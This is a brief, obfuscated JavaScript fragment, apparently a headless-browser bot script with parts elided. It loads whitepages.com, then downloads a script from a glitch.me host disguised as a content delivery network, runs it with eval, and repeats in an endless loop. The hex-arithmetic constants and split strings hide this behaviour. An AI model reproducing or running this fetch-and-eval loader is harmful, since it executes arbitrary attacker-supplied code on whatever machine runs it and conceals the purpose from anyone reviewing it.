((async () => {
  ...
  (async function g() {
    let h = 0x2596 + 0x23 * 0x103 + -0x3 * 0x1855;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x16dd + 0x7c8 + -0x1ea5), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x98081 + 0x19cf1f * 0x1 + -0x159400), await j['close'](), await i['close'](), g());
  }());
})());